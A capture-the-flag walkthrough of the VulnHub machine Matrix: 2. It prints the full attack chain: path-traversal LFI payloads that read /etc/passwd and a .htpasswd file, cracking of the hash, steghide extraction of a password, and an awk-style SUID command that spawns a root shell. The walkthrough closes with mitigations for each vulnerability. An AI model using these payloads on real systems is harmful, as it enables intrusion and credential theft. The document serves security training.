# Matrix: 2 CTF Walkthrough

**Target:** Matrix: 2  
**Source:** [VulnHub](https://www.vulnhub.com/entry/matrix-2,279/)  
**Difficulty:** Intermediate  
**Target IP:** 10.0.2.25  

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration — Port 12322](#web-enumeration--port-12322)
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [Credential Discovery & Hash Cracking](#credential-discovery--hash-cracking)
- [Steganography — Hidden Image](#steganography--hidden-image)
- [Initial Access — Shell In A Box](#initial-access--shell-in-a-box)
- [Privilege Escalation — morpheus GTFOBins](#privilege-escalation--morpheus-gtfobins)
- [Root Flag](#root-flag)
- [Vulnerabilities](#vulnerabilities)
- [Recommendations](#recommendations)

---

## Overview

Matrix: 2 is a medium-difficulty boot2root challenge. The attack path requires thorough port enumeration across several non-standard services, exploiting a Local File Inclusion vulnerability to read server configuration and credential files, cracking an Apache MD5 hash, extracting a password hidden inside a JPEG via steganography, and finally leveraging a SUID-equivalent custom binary (`morpheus`) to spawn a root shell.

**Key Skills Required:**
- Full-range port enumeration
- Local File Inclusion (LFI) exploitation
- Apache `.htpasswd` hash cracking with John the Ripper
- Steganography extraction with Steghide
- Linux privilege escalation via a GTFOBins-style custom binary

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -Pn -p- 10.0.2.25
```

Note the use of `-p-` to scan **all 65,535 ports** — essential here, as several services run on high, non-standard ports.

**Results:**

| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 80/tcp | open | http | nginx 1.10.3 — "Welcome in Matrix v2 Neo" |
| 1337/tcp | open | ssl/http | nginx — **401 Authorization Required** |
| 12320/tcp | open | ssl/http | ShellInABox |
| 12321/tcp | open | ssl/? | Nothing interesting |
| 12322/tcp | open | ssl/http | nginx — `robots.txt` present |

**Key Observations:**
- Port 80 is a static landing page; no useful content.
- Port 1337 (SSL) immediately presents HTTP Basic Auth — credentials needed before proceeding.
- Port 12320 runs [Shell In A Box](https://github.com/shellinabox/shellinabox), a browser-based terminal emulator — a potential login target.
- Port 12322 (SSL) has a `robots.txt` and is the most interesting enumeration target.

---

## Web Enumeration — Port 12322

### Robots.txt

```bash
curl -k https://10.0.2.25:12322/robots.txt
```

```
User-agent: *
Disallow: file_view.php
```

Ironically, `robots.txt` reveals a hidden endpoint: `file_view.php`. Fetching it directly:

```bash
curl -k https://10.0.2.25:12322/file_view.php
```

```html
<!-- Error file parameter missing..!!! -->
```

The error confirms the script expects a `file` parameter — a classic LFI setup.

---

## Local File Inclusion (LFI)

### Confirming LFI — /etc/passwd

```bash
curl -k https://10.0.2.25:12322/file_view.php -d "file=../../../../../etc/passwd"
```

The full `/etc/passwd` is returned. Key accounts of interest:

```
root:x:0:0:root:/root:/bin/bash
n30:x:1000:1000:Neo,,,:/home/n30:/bin/bash
testuser:x:1001:1001::/home/testuser:
shellinabox:x:107:109:Shell In A Box,,,:/var/lib/shellinabox:/bin/false
```

`n30` (Neo) is the primary user account with a valid login shell. Shell In A Box is present as a system account.

### Reading nginx Configuration

```bash
curl -k https://10.0.2.25:12322/file_view.php -d "file=../../../../../etc/nginx/sites-enabled/default"
```

The virtual host configuration reveals an important detail:

```nginx
server {
    listen 1337 ssl;
    root /var/www/;
    index index.html index.php;

    auth_basic "Welcome to Matrix 2";
    auth_basic_user_file /var/www/p4ss/.htpasswd;
    ...
}
```

Port 1337's HTTP Basic Auth reads credentials from `/var/www/p4ss/.htpasswd` — a file we can now read via LFI.

---

## Credential Discovery & Hash Cracking

### Extracting the .htpasswd File

```bash
curl -k https://10.0.2.25:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htpasswd"
```

```
Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
```

This is an Apache MD5 (`$apr1$`) hash. Username is `Tr1n17y` (Trinity).

### Cracking the Hash with John the Ripper

```bash
echo 'Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
admin            (Tr1n17y)
1g 0:00:00:00 DONE (2026-05-17 15:06) — Session completed.
```

**Credentials recovered:**
- Username: `Tr1n17y`
- Password: `admin`

### Logging into Port 1337

Visiting `https://10.0.2.25:1337` with these credentials and inspecting the page source reveals a commented-out image tag:

```html
<!--img src="h1dd3n.jpg"-->
```

Download the image:

```bash
curl -k -u Tr1n17y:admin https://10.0.2.25:1337/h1dd3n.jpg -O
```

---

## Steganography — Hidden Image

The filename `h1dd3n.jpg` ("hidden") combined with the CTF context is an immediate steganography hint. The username `n30` (found in `/etc/passwd`) is a natural passphrase candidate.

```bash
steghide extract -sf h1dd3n.jpg -p n30
```

```
wrote extracted data to "n30.txt".
```

```bash
cat n30.txt
```

```
P4$$w0rd
```

**Credentials found:**
- Username: `n30`
- Password: `P4$$w0rd`

---

## Initial Access — Shell In A Box

Port 12320 runs Shell In A Box — a browser-based terminal. Log in at `https://10.0.2.25:12320` using the credentials above.

```
n30@Matrix_2 ~$ whoami
n30

n30@Matrix_2 ~$ ls -la
total 36
drwxr-xr-x 5 n30  n30  4096 Dec  8  2018 .
drwxr-xr-x 3 root root 4096 Dec  7  2018 ..
-rw------- 1 n30  n30   950 Dec 13  2018 .bash_history
drwxr-xr-x 2 n30  n30  4096 Dec  7  2018 .bashrc.d
-rw-r--r-- 1 n30  n30     0 Dec  8  2018 .penv
drwx------ 2 n30  n30  4096 Dec  7  2018 .ssh
```

```bash
n30@Matrix_2 ~$ sudo -l
-bash: sudo: command not found
```

`sudo` is unavailable. Checking `.bash_history` for clues:

```bash
n30@Matrix_2 ~$ cat .bash_history
```

The history is highly revealing — it shows extensive experimentation with a binary called `morpheus`:

```
morpheus 'BEGIN {system("/bin/sh")}'
ls -l /usr/bin/morpheus
chown n30:n30 /usr/bin/morpheus
chmod 550 /usr/bin/morpheus
chown root /usr/bin/morpheus
morpheus 'BEGIN {system("/bin/sh")}'
```

The syntax `'BEGIN {system("/bin/sh")}'` is `awk`-style — `morpheus` appears to be an `awk`-like binary (or a wrapper around it) that executes with elevated privileges.

---

## Privilege Escalation — morpheus GTFOBins

```bash
n30@Matrix_2 ~$ morpheus 'BEGIN {system("/bin/sh")}'
```

```
# whoami
root

# cd /root
# ls
flag.txt
```

`morpheus` is a SUID binary that runs as root. Passing an `awk`-style `BEGIN` block with `system()` spawns a root shell immediately — the same technique documented on [GTFOBins for awk](https://gtfobins.github.io/gtfobins/awk/).

---

## Root Flag

```bash
# cat flag.txt
```

```
YOURE FASTER THAN THIS.
DONT THINK YOU ARE,
KNOW YOU ARE.
-MORPHEUS
AKA
UNKNOWNDEVICE64
```

**PWNED!**

---

## Vulnerabilities

### 1. Unauthenticated Local File Inclusion — file_view.php (Critical)

**Description:** `file_view.php` on port 12322 accepts a user-supplied `file` parameter and reads arbitrary files from the server filesystem without any authentication or path sanitization.

**Impact:** An attacker can read any file readable by the web server process — including `/etc/passwd`, nginx configuration files, and credential stores like `.htpasswd`. In more complex scenarios, LFI can be chained into Remote Code Execution via log poisoning or `/proc/self/environ` injection.

**Mitigation:**
- Never pass user-supplied input directly to file-reading functions
- Implement a strict allowlist of permitted files/paths
- Serve sensitive configuration files outside the web root
- Run the web server process with the minimum required privileges

---

### 2. Sensitive Credentials Exposed via LFI — .htpasswd (High)

**Description:** The nginx virtual host configuration on port 1337 pointed to an `.htpasswd` file at `/var/www/p4ss/.htpasswd`. Because this path was readable by the web server process, the LFI vulnerability allowed direct extraction of the hashed credential.

**Impact:** Once retrieved, the Apache MD5 hash (`$apr1$`) was cracked in under a second against the rockyou wordlist due to the weak password (`admin`).

**Mitigation:**
- Store credential files outside the web root entirely
- Enforce strong, unique passwords — `admin` against rockyou is instant
- Remediate the LFI vulnerability to prevent file disclosure in the first place

---

### 3. Password Embedded in Image via Steganography (High)

**Description:** A valid system account password (`P4$$w0rd` for user `n30`) was hidden inside `h1dd3n.jpg` using Steghide, accessible to anyone who could retrieve the image from the authenticated port 1337 endpoint.

**Impact:** Once an attacker obtained the Trinity credentials (via LFI + hash cracking), they could retrieve the image and extract the next credential, fully chaining the attack to system access.

**Mitigation:**
- Never store credentials in steganographic or otherwise obfuscated form on the server
- Treat any encoding or concealment technique as equivalent to plaintext — it provides no cryptographic security

---

### 4. SUID Custom Binary with Shell Execution — morpheus (Critical)

**Description:** `/usr/bin/morpheus` is a SUID binary owned by root that accepts `awk`-style program arguments. Passing `'BEGIN {system("/bin/sh")}'` executes an arbitrary command as root.

**Vulnerable call:**
```bash
morpheus 'BEGIN {system("/bin/sh")}'
```

**Impact:** Any user on the system with execute permission on `morpheus` gains an immediate root shell. This is functionally equivalent to running `awk` as root — a well-known GTFOBins vector.

**Mitigation:**
- Audit all SUID/SGID binaries: `find / -perm -4000 -type f 2>/dev/null`
- Remove the SUID bit from `morpheus` unless strictly necessary: `chmod u-s /usr/bin/morpheus`
- Never set SUID on binaries capable of arbitrary code execution (interpreters, shells, `awk`-like tools)
- Verify all custom binaries against [GTFOBins](https://gtfobins.github.io/) before deployment

---

## Recommendations

### Web Application Security

- Implement strict input validation on all file-handling endpoints; use allowlists, not blocklists
- Store all configuration files and credential stores outside the web root
- Add authentication to all service endpoints, not just those containing "sensitive" content
- Conduct regular web application penetration tests and code reviews

### Credential Management

- Enforce a strong password policy — dictionary words and simple substitutions (`admin`, `P4$$w0rd`) are trivially cracked
- Never store credentials in encoded, obfuscated, or steganographic form on the server
- Rotate credentials regularly; do not reuse passwords across services
- Use a proper secrets manager for sensitive material

### SUID Binary Hardening

- Audit SUID binaries on every system, especially after software installation
- Apply the principle of least privilege — custom tools should not require SUID root
- Prefer capabilities (`setcap`) over SUID where possible, and only grant the specific capability required
- Any binary that can execute arbitrary programs or spawn a shell must never carry the SUID bit

### Defense in Depth

- Implement network-level segmentation to restrict access to high-numbered service ports
- Enable and configure fail2ban or equivalent for all externally reachable services
- Centralise logging (nginx, auth events, shell activity) and alert on anomalous behaviour

---

## Attack Chain Summary

```
Nmap Full Port Scan (-p-) → Ports 80, 1337, 12320, 12321, 12322
        ↓
Port 12322 — robots.txt reveals file_view.php
        ↓
LFI via file_view.php → /etc/passwd, nginx config
        ↓
nginx config reveals /var/www/p4ss/.htpasswd
        ↓
LFI → .htpasswd → Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
        ↓
John the Ripper + rockyou.txt → Tr1n17y:admin
        ↓
Login to port 1337 → Page source: <!--img src="h1dd3n.jpg"-->
        ↓
Download h1dd3n.jpg
        ↓
steghide extract -sf h1dd3n.jpg -p n30 → P4$$w0rd
        ↓
Login to Shell In A Box (port 12320) → n30:P4$$w0rd
        ↓
.bash_history reveals morpheus binary & awk-style syntax
        ↓
morpheus 'BEGIN {system("/bin/sh")}' → Root Shell
        ↓
cat /root/flag.txt — SYSTEM PWNED
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Full-range network & service scanning (`-p-`) |
| curl | HTTP/HTTPS file retrieval and LFI exploitation |
| John the Ripper | Apache MD5 hash cracking |
| rockyou.txt | Password wordlist |
| Steghide | Steganographic data extraction from JPEG |
| Shell In A Box | Browser-based terminal (attacker entry point) |
| morpheus | GTFOBins-style SUID binary — privilege escalation |

---

## References

- [VulnHub - Matrix: 2](https://www.vulnhub.com/entry/matrix-2,279/)
- [GTFOBins - awk](https://gtfobins.github.io/gtfobins/awk/)
- [Shell In A Box](https://github.com/shellinabox/shellinabox)
- [Steghide](http://steghide.sourceforge.net/)
- [John the Ripper](https://www.openwall.com/john/)
- [Wikipedia - Steganography](https://en.wikipedia.org/wiki/Steganography)

---

## Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

---
*"You're faster than this. Don't think you are, know you are."*
